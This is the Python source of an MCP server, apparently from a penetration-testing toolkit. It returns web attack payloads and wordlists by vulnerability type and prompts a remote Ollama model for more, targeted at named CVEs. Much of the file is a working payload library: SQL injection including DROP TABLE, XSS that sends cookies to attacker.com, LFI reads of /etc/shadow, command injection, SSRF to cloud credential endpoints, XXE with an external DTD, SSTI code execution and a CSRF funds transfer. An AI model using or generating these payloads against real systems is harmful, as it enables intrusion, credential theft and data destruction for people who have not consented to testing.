#!/usr/bin/env python3
"""
SOCIS-AI-PT — CVE-Aware Payload Generator MCP Server (HTTP transport)

Generates security test payloads for specific vulnerability types using:
1. External Ollama server (if configured via OLLAMA_REMOTE_URL)
2. Static payload library fallback (always available)

Port: 8124
"""

import json
import logging
import os
import asyncio
from typing import Any

import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

from mcp_auth import verify_mcp_auth, mcp_auth_error

# ───────────────────────────────────────────────────────────
# CONFIGURATION
# ───────────────────────────────────────────────────────────

TOOL_NAME = "payload_generator"
MCP_PORT = 8124
SERVER_NAME = f"{TOOL_NAME}-mcp"
OLLAMA_BASE_URL = os.environ.get("OLLAMA_REMOTE_URL") or os.environ.get("OLLAMA_BASE_URL", "")  # external server only
OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "llama3")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ───────────────────────────────────────────────────────────
# STATIC PAYLOAD LIBRARY
# ───────────────────────────────────────────────────────────

STATIC_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR 1=1--",
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE users--",
        "1' AND SLEEP(5)--",
        "1 AND 1=1",
        "' OR 1=1#",
        "admin'--",
        "1' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' OR 'unusual'='unusual",
        "') OR ('1'='1",
        "1; WAITFOR DELAY '0:0:5'--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input type=image src=1 onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "%-3Cscript%3Ealert(1)%3C/script%3E",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        "<img src=1 onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "../../../proc/self/environ",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
        "../../../../var/log/apache2/access.log",
        "/proc/version",
        "../../../../etc/hosts",
        "..././..././..././etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ],
    "rce": [
        "; id",
        "; whoami",
        "| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "; ls -la",
        "| cat /etc/passwd",
        "; ping -c 1 127.0.0.1",
        "; sleep 5",
        "'; exec('id')",
        "{{7*7}}",
        "${7*7}",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/user-data",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stat",
        "gopher://127.0.0.1:6379/_PING",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}",
        "{% for x in [].class.base.subclasses() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2F..",
        "\\\\evil.com",
        "https:evil.com",
        "/\\evil.com",
        "//google.com@evil.com",
        "%0a%0dhttps://evil.com",
        "//evil.com%2F%2F",
        "///evil.com",
    ],
    "idor": [
        "1", "2", "3", "0", "-1",
        "admin", "administrator",
        "00000000-0000-0000-0000-000000000001",
        "../user/2",
        "user_id=1337",
    ],
    "csrf": [
        '<form action="https://target.com/transfer" method="POST"><input name="amount" value="10000"><input name="to" value="attacker"></form><script>document.forms[0].submit();</script>',
        '<img src="https://target.com/api/delete?id=1">',
        '<link rel="stylesheet" href="https://target.com/api/sensitive?callback=steal">',
    ],
    "path_traversal": [
        "../",
        "../../",
        "../../../",
        "..%2F",
        "..%2F..%2F",
        "%2e%2e%2f",
        "%2e%2e/",
        ".%2e/",
        "%2e./",
        "..\\",
        "..\\..\\",
    ],
    "header_injection": [
        "\r\nX-Injected: value",
        "%0d%0aX-Injected: value",
        "%0aX-Injected: value",
        "\nX-Injected: value",
        "%0d%0aContent-Length: 0%0d%0a%0d%0a",
        "value\r\nSet-Cookie: injected=true",
        "%0d%0aLocation: https://evil.com",
    ],
}

VULN_TYPE_DESCRIPTIONS = {
    "sqli": "SQL Injection",
    "xss": "Cross-Site Scripting (XSS)",
    "lfi": "Local File Inclusion (LFI)",
    "rce": "Remote Code Execution (RCE)",
    "ssrf": "Server-Side Request Forgery (SSRF)",
    "xxe": "XML External Entity (XXE) Injection",
    "ssti": "Server-Side Template Injection (SSTI)",
    "open_redirect": "Open Redirect",
    "idor": "Insecure Direct Object Reference (IDOR)",
    "csrf": "Cross-Site Request Forgery (CSRF)",
    "path_traversal": "Path Traversal",
    "header_injection": "HTTP Header Injection",
}

# ───────────────────────────────────────────────────────────
# TOOL DEFINITIONS
# ───────────────────────────────────────────────────────────

TOOLS = [
    {
        "name": "generate_payloads",
        "description": (
            "Generate security test payloads for a specific vulnerability type. "
            "Uses local Ollama LLM if configured (CVE-context-aware), falls back to "
            "a curated static library. Returns both static and AI-generated payloads."
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "vuln_type": {
                    "type": "string",
                    "description": "Vulnerability type",
                    "enum": list(STATIC_PAYLOADS.keys())
                },
                "target_context": {
                    "type": "string",
                    "description": "Optional context: describe the target (e.g., 'login form on PHP Laravel app')"
                },
                "cve_id": {
                    "type": "string",
                    "description": "Optional CVE ID for targeted payload generation (e.g., CVE-2021-44228)"
                },
                "count": {
                    "type": "integer",
                    "description": "Number of payloads to return",
                    "default": 10
                },
                "use_ai": {
                    "type": "boolean",
                    "description": "Whether to use Ollama LLM for AI-generated payloads (requires OLLAMA_REMOTE_URL)",
                    "default": True
                }
            },
            "required": ["vuln_type"]
        }
    },
    {
        "name": "generate_wordlist",
        "description": (
            "Generate a security wordlist file for fuzzing. Combines static payloads for the "
            "specified vuln types and optionally adds AI-generated variants. "
            "Returns a newline-delimited wordlist string."
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "vuln_types": {
                    "type": "array",
                    "description": "List of vulnerability types to include in wordlist",
                    "items": {"type": "string", "enum": list(STATIC_PAYLOADS.keys())}
                },
                "include_ai": {
                    "type": "boolean",
                    "description": "Whether to request AI-augmented payloads",
                    "default": False
                },
                "deduplicate": {
                    "type": "boolean",
                    "description": "Remove duplicate payloads",
                    "default": True
                }
            },
            "required": ["vuln_types"]
        }
    },
    {
        "name": "list_vuln_types",
        "description": "List all supported vulnerability types and their descriptions.",
        "inputSchema": {
            "type": "object",
            "properties": {}
        }
    },
]

app = FastAPI(title=f"SOCIS {TOOL_NAME} MCP Server", docs_url=None)


# ───────────────────────────────────────────────────────────
# AI PAYLOAD GENERATION (OLLAMA)
# ───────────────────────────────────────────────────────────

async def _ai_generate_payloads(
    vuln_type: str,
    target_context: str,
    cve_id: str | None,
    count: int,
) -> tuple[list[str], str]:
    """
    Request additional payloads from Ollama. Returns (payloads, source).
    source is "ai+static" or "static_only" if AI failed.
    """
    if not OLLAMA_BASE_URL:
        return [], "static_only"

    cve_part = f" Specifically target {cve_id}." if cve_id else ""
    context_part = f" Target context: {target_context}." if target_context else ""

    prompt = (
        f"You are a penetration testing expert. Generate {count} unique, creative, and "
        f"effective {VULN_TYPE_DESCRIPTIONS.get(vuln_type, vuln_type)} payloads for security testing.{cve_part}{context_part} "
        f"Output ONLY the payloads, one per line, no explanations, no numbering, no markdown."
    )

    try:
        async with httpx.AsyncClient(timeout=30.0) as client:
            resp = await client.post(
                f"{OLLAMA_BASE_URL}/api/generate",
                json={"model": OLLAMA_MODEL, "prompt": prompt, "stream": False},
            )
            resp.raise_for_status()
            text = resp.json().get("response", "")
            payloads = [
                line.strip()
                for line in text.strip().splitlines()
                if line.strip() and not line.strip().startswith("#")
            ]
            return payloads[:count], "ai+static"
    except Exception as exc:
        log.warning(f"[payload_generator] Ollama AI generation failed: {exc}")
        return [], "static_only"


# ───────────────────────────────────────────────────────────
# TOOL HANDLERS
# ───────────────────────────────────────────────────────────

async def handle_generate_payloads(args: dict) -> dict:
    vuln_type = str(args.get("vuln_type") or "").lower()
    if vuln_type not in STATIC_PAYLOADS:
        raise ValueError(f"Unknown vuln_type '{vuln_type}'. Supported: {list(STATIC_PAYLOADS.keys())}")

    target_context = str(args.get("target_context") or "")
    cve_id = str(args.get("cve_id") or "") or None
    count = max(1, min(100, int(args.get("count") or 10)))
    use_ai = bool(args.get("use_ai", True))

    static = STATIC_PAYLOADS[vuln_type]
    ai_payloads: list[str] = []
    source = "static_only"

    if use_ai and OLLAMA_BASE_URL:
        ai_payloads, source = await _ai_generate_payloads(vuln_type, target_context, cve_id, count)

    # Merge: AI payloads first (more targeted), then static fill-in
    all_payloads = ai_payloads + [p for p in static if p not in ai_payloads]
    all_payloads = all_payloads[:count]

    return {
        "vuln_type": vuln_type,
        "description": VULN_TYPE_DESCRIPTIONS.get(vuln_type, vuln_type),
        "cve_id": cve_id,
        "target_context": target_context,
        "source": source,
        "count": len(all_payloads),
        "payloads": all_payloads,
        "ai_available": bool(OLLAMA_BASE_URL),
    }


async def handle_generate_wordlist(args: dict) -> dict:
    vuln_types = args.get("vuln_types") or []
    if not vuln_types:
        raise ValueError("'vuln_types' must be a non-empty list")

    include_ai = bool(args.get("include_ai", False))
    deduplicate = bool(args.get("deduplicate", True))

    all_payloads: list[str] = []
    for vtype in vuln_types:
        vtype = str(vtype).lower()
        if vtype not in STATIC_PAYLOADS:
            continue
        all_payloads.extend(STATIC_PAYLOADS[vtype])

        if include_ai and OLLAMA_BASE_URL:
            ai_list, _ = await _ai_generate_payloads(vtype, "", None, 10)
            all_payloads.extend(ai_list)

    if deduplicate:
        seen = set()
        deduped = []
        for p in all_payloads:
            if p not in seen:
                seen.add(p)
                deduped.append(p)
        all_payloads = deduped

    wordlist = "\n".join(all_payloads)

    return {
        "vuln_types": vuln_types,
        "total": len(all_payloads),
        "ai_augmented": include_ai and bool(OLLAMA_BASE_URL),
        "wordlist": wordlist,
    }


def handle_list_vuln_types(args: dict) -> dict:
    return {
        "vuln_types": [
            {
                "type": vtype,
                "description": VULN_TYPE_DESCRIPTIONS.get(vtype, vtype),
                "static_payload_count": len(payloads),
            }
            for vtype, payloads in STATIC_PAYLOADS.items()
        ],
        "total_types": len(STATIC_PAYLOADS),
        "ai_available": bool(OLLAMA_BASE_URL),
        "ollama_model": OLLAMA_MODEL if OLLAMA_BASE_URL else None,
    }


# ───────────────────────────────────────────────────────────
# MCP PROTOCOL HANDLER
# ───────────────────────────────────────────────────────────

@app.get("/health")
async def health_check():
    return {"status": "healthy", "server": SERVER_NAME, "ai_available": bool(OLLAMA_BASE_URL)}


@app.post("/mcp")
async def handle_mcp_request(request: Request):
    if not verify_mcp_auth(request):
        return mcp_auth_error()
    try:
        data = await request.json()
        req_id = data.get("id")
        method = data.get("method")

        if method == "tools/list":
            return JSONResponse({"jsonrpc": "2.0", "id": req_id, "result": {"tools": TOOLS}})

        elif method == "initialize":
            return JSONResponse({
                "jsonrpc": "2.0", "id": req_id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "serverInfo": {"name": SERVER_NAME, "version": "1.0"},
                    "capabilities": {"tools": {}},
                },
            })

        elif method == "tools/call":
            tool_name = data.get("params", {}).get("name")
            arguments = data.get("params", {}).get("arguments", {})
            log.info(f"[MCP] Executing tool: {tool_name}")

            if not any(t["name"] == tool_name for t in TOOLS):
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32000, "message": f"Unknown tool: {tool_name}"}},
                    status_code=400,
                )

            try:
                if tool_name == "generate_payloads":
                    result = await handle_generate_payloads(arguments)
                elif tool_name == "generate_wordlist":
                    result = await handle_generate_wordlist(arguments)
                elif tool_name == "list_vuln_types":
                    result = handle_list_vuln_types(arguments)
                else:
                    raise ValueError(f"No handler for tool: {tool_name}")

                return JSONResponse({
                    "jsonrpc": "2.0", "id": req_id,
                    "result": {"content": [{"type": "text", "text": json.dumps(result, indent=2)}]}
                })

            except ValueError as e:
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32000, "message": str(e)}},
                    status_code=400,
                )
            except Exception as e:
                log.error(f"[MCP] Tool execution error: {e}")
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32603, "message": str(e)}},
                    status_code=500,
                )

        else:
            return JSONResponse(
                {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32601, "message": f"Method not found: {method}"}},
                status_code=404,
            )

    except json.JSONDecodeError:
        return JSONResponse({"jsonrpc": "2.0", "id": None, "error": {"code": -32700, "message": "Parse error"}}, status_code=400)
    except Exception as e:
        log.error(f"[MCP] Unexpected error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


if __name__ == "__main__":
    log.info(f"Starting {SERVER_NAME} on port {MCP_PORT}")
    uvicorn.run(app, host="0.0.0.0", port=MCP_PORT, log_level="info")
